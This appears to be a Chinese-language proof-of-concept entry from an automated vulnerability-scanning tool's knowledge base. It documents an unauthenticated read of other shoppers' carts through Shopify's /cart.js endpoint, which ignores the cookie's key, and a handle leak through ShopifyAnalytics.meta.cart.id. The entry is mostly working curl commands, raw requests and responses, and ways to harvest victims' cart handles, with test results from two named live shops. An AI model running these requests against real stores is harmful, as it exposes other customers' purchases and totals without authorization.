# Shopify 购物车跨会话只读 IDOR 的两个补充面：Ajax Cart API /cart.js 裸 handle cookie 可读 + handle 经 ShopifyAnalytics.meta.cart.id 泄漏

- **code**: shopify-cart-read-key-not-enforced-2nd-surface
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront（/api/graphql Cart + Ajax Cart API /cart.js）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 两靶标实测：① retro-refresh.com（task#9，2026-11-11）：GET /cart.js 仅带 Cookie: cart=<25位handle>（去掉 ?key）→ 200 返回该 handle 对应他人购物车全量（含 line properties victim=VFR9-VICTIM、total_price 24900）；写路径 /cart/change.js、/cart/add.js 仅带裸 cookie → 新建空 cart，受害者 cart 原样不变；随机 handle → 空。② goffsgames.co.uk（task#11, finding_id=80，2026-11-11 15:06–15:12 UTC，curl -A "$ARTEX_UA" 经平台记录代理 127.0.0.1:21102，单线程、间隔≥3s）：无 cookie POST /cart/add.js {"items":[{"id":65471046386013,"quantity":1}]} → 200, Set-Cookie: cart=hWNJ1mzYJfSmCW7tczd8...%3Fkey%3D36feff66...；①带正确 key GET /cart.js → 200 {"token":"<handle>?key=36feff66...","item_count":1,"original_total_price":3999}；②去掉 key Cookie: cart=<handle> → 200 同一车 item_count:1（决定性：key 被忽略）；③改为 ?key=deadbeefdeadbeefdeadbeefdeadbeef → 200 仍返回同一车，token 归一化为 handle；④阴性对照随机 handle AAAAAAAAAAAAAAAAAAAAAAAAA → 200 {"item_count":0} 空车（排除兜底误报）；⑤写路径对照 POST /cart/change.js 无 key → 200 新建空车 item_count:0（目标车不动）、/cart/update.js 错 key → 422。判据成立：读路径不校验 ?key。原始响应落盘 /opt/artex/data/tasks/11/i743/。
- **path**: pocs/shopify-cart-read-key-not-enforced-2nd-surface/poc.md
- **tags**: shopify,cart,idor,unauthorized,cart.js,shopifyanalytics,handle-leak,ecommerce,access-control
- **created_at**: 2026-11-11T15:12:52.035Z
- **engine**: https://retro-refresh.com; https://goffsgames.co.uk
- **found_by**: vuln-scan

## 描述

对已知弹药「shopify-storefront-api-cart-id-ignores-key-unauth-read (KB#524) / node(id:) 变体 (KB#542)」的补充：同一店铺读取他人购物车还有**第二个独立出口** —— Shopify Ajax Cart API `GET /cart.js` 同样忽略 cart cookie 里的 `?key`（仅凭 25 位 handle 即可读他人 cart 全量：item_count/行项目/金额/重量，token 被归一化为 handle）。这是 HTTP cookie AJAX 面，与 GraphQL API 面（cart(id:)/node(id:)）机制不同、需分别探测。且 handle 并非只在 HttpOnly cookie：它同时以 JS 可读全局 `window.ShopifyAnalytics.meta.cart.id` 出现在店面 HTML，任意页面内 JS（输出编码/第三方脚本缺陷）可外带；`/cart.js` 响应 `token` 字段也返回 handle。唯一前置仍是拿到 25 位随机 handle（无枚举面），故定级 medium。

## 用法

```
读他人购物车（无凭据，只需 handle）：
  # 第二入口：裸 handle cookie，去掉 ?key
  curl -sk 'https://<shop>/cart.js' -H 'Cookie: cart=<25位handle>'
   # → 200 {"token":"<handle>","item_count":N,"original_total_price":...,...}  该车全量
  # 带任意错误 key 仍返回同一车（决定性判据：key 完全未被校验）
  curl -sk 'https://<shop>/cart.js' -H 'Cookie: cart=<handle>%3Fkey%3Ddeadbeef...'
  # 阴性对照：不存在的随机 handle → 200 空车+随机新 token（排除兜底误报）
  curl -sk 'https://<shop>/cart.js' -H 'Cookie: cart=AAAAAAAAAAAAAAAAAAAAAAAAA'

建基线车拿 handle/key 结构（对照：正常访问必须带 ?key=<32hex>）：
  curl -sk 'https://<shop>/cart/add.js' -H 'Content-Type: application/json' \
    --data '{"items":[{"id":<VARIANT_ID>,"quantity":1}]}'
  # → 200, Set-Cookie: cart=<25位handle>%3Fkey%3D<32hex>; path=/; SameSite=Lax

拿 handle 的其它途径：店面 HTML 内嵌 window.ShopifyAnalytics.meta.cart.id；/cart.js 响应的 token 字段（handle 为 token 里 ?key 之前那段）；分享的购物车/结账链接、Referer、访问日志。

写路径对照（界定读/写不一致，读的宽松 ≠ 无鉴权）：
  POST /cart/change.js  Cookie: cart=<handle>（无 key）→ 200 但返回**新建空车** item_count:0，目标车不动；
  POST /cart/update.js  错 key → 422。

GraphQL 面（同店独立出口，见 KB#524/#542）：不带 / 错 key 的 cart(id:)/node(id:) 也返回同一 cart。
判据：错误的是——只有「去掉或改错 ?key 仍返回同一 handle 的同一购物车」才算数；随机 handle 必须回落空车，排除「200 恒返回数据」的兜底误报。
失败常见原因：handle 非 25 位 base62；cookie 名必须是 cart；目标店铺关了 AJAX Cart 或 WAF 限速（单线程、请求间隔 ≥3s）。
```

## 正文

```
# Shopify Ajax Cart API /cart.js 忽略 cookie 里的 ?key —— 仅凭 handle 未认证读他人购物车

## 一句话
Shopify 托管店的 AJAX 购物车读端点 `GET /cart.js` 从 cookie `cart=<handle>?key=<key>` 解析购物车时**不校验 `?key` 能力分量**：去掉 key（cookie 只留 25 位 handle）或改成任意错误 key，均返回该购物车的完整内容（`token` 被归一化为 handle，`item_count`/行项目/金额/重量照常返回）。购物车仅凭 25 位随机 handle 即可被未认证第三方读取。

与 Storefront GraphQL 的 `cart(id:)` / `node(id:)`（KB#524 / KB#542）同样忽略 `?key`，属**同一读路径访问控制不一致**，但**机制不同、是两个独立出口**：
- HTTP cookie AJAX 面：`GET /cart.js`（本条）
- GraphQL API 面：`POST /api/graphql` `cart(id:)/node(id:)`（KB#524 / KB#542）

## 前提
- 目标为 Shopify 托管店，AJAX Cart API 匿名可达（`GET /cart.js` 返回 `{"token":...}`）。
- 需一个有效的 25 位购物车 handle。来源：分享的购物车/结账链接、`/cart.js` 响应的 `token` 字段、店面 HTML 里的 `window.ShopifyAnalytics.meta.cart.id`、Referer、访问日志。
- 无需任何账号 / Cookie / Token（全匿名）。
- 为观察写入需一个可加购的 variant id。

## 复现（无凭据）

### 0) 建基线车，证明 AJAX cart cookie 值形如 `<25位handle>?key=<32hex>`（与 GraphQL cart GID 同构）
```
POST /cart/add.js HTTP/2
Host: <shop>
Content-Type: application/json
(无 Cookie)

{"items":[{"id":<VARIANT_ID>,"quantity":1}]}
-> 200
   set-cookie: cart=<25位handle>%3Fkey%3D<32hex>; path=/; SameSite=Lax; expires=...
   (体内为新增 line item 对象)
```

### 1) 带正确 key 的基线
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=<25位handle>%3Fkey%3D<32hex>
-> 200 {"token":"<handle>?key=<32hex>","item_count":1,"original_total_price":...,...}
```

### 2) 决定性：不带 key，仅凭 handle 读回同一车 → 读路径不校验 ?key
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=<25位handle>          (去掉 ?key)
-> 200 {"token":"<handle>","item_count":1,"original_total_price":...}   ← 同一车
```

### 3) 带任意错误 key 仍返回该车 → key 完全未被校验（非宽松匹配）
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=<handle>%3Fkey%3Ddeadbeefdeadbeefdeadbeefdeadbeef
-> 200 {"token":"<handle>","item_count":1,...}   ← 仍返回该车，token 归一化为 handle
```

### 4) 阴性对照：不存在的 handle → 空车 + 随机新 token（排除“200 恒返回数据”的兜底误报）
```
GET /cart.js HTTP/2
Host: <shop>
Cookie: cart=AAAAAAAAAAAAAAAAAAAAAAAAA
-> 200 {"token":"<新随机>","item_count":0,"items":[],...}
```

### 5) 写路径对照：无 key 时改的是新建空车，目标车不受影响（写路径要求 key）
```
POST /cart/change.js HTTP/2
Host: <shop>
Content-Type: application/json
Cookie: cart=<handle>          (无 key)

{"id":"<VARIANT>:<hash>","quantity":3}
-> 200 {"token":"<新token>","item_count":0,...,"items_added":[],"items_removed":[]}
```
（`/cart/update.js` 带错 key → 422）

## 判定 / 边界
- 判据：**去掉或改错 `?key` 仍返回同一 handle 的同一购物车**；随机 handle 必须回落空车。
- 读路径宽松、写路径（`/cart/add.js`、`/cart/change.js`、`/cart/update.js`、GraphQL `cartLinesAdd` 等）仍严格要求 key → 是访问控制不一致（非完全无鉴权），无跨对象写入。
- 影响面：需先获得 25 位 base62 handle（不可枚举）；价值在 handle 泄漏场景（分享结账链接 / Analytics 全局变量 / Referer / 日志）下放大为他人购物车轮项目与金额泄露。

## 跨靶标复现（同一缺陷，多店交叉验证）
- **retro-refresh.com（task#9）**：`GET /cart.js` 仅带 `Cookie: cart=<25位handle>`（去掉 ?key）→ 200 返回该 handle 对应他人购物车全量（含 line properties `victim=VFR9-VICTIM`、`total_price 24900`）；攻击者完全独立无 cookie 会话亦可通过 GraphQL 读同车；店面 HTML 内嵌 `window.ShopifyAnalytics.meta.cart.id="<handle>"`（JS 可读、非 HttpOnly）；写路径仍强制 key。
- **goffsgames.co.uk（task#11, finding_id=80）**：建车 `POST /cart/add.js {"items":[{"id":65471046386013,"quantity":1}]}` → Set-Cookie `cart=<25位handle>%3Fkey%3D<32hex>`；带正确 key 读 → `{"token":"<handle>?key=...","item_count":1,"original_total_price":3999}`；**去掉 key → 200 同一车 `item_count:1`**；带 `?key=deadbeef...` 错 key → 200 仍返回同一车；随机 handle → `item_count:0` 空车；写路径对照 `/cart/change.js` 无 key → `item_count:0`（新建空车）、`/cart/update.js` 错 key → 422。

## 实测样例（脱敏，goffsgames.co.uk task#11）
- handle：`hWNJ1mzYJfSmCW7tczd8...`（key `36feff66...`，读路径均未携带）
- 不带 / 错误 key 读均返回同一车 `item_count:1`、`original_total_price:3999`
- 原始响应落盘 `/opt/artex/data/tasks/11/i743/`（ev_b_*.json/.out、t1–t4.out、w1b–w3b.out）

## 失败常见原因
- handle 非 25 位 base62；cookie 名必须是 `cart`，`?key` 部分需 URL 编码为 `%3Fkey%3D`；
- 目标店铺关闭 AJAX Cart 或 Storefront token 未公开（返回 401/403 或 HTML）；
- WAF 限速：单线程、请求间隔 ≥3s。
```
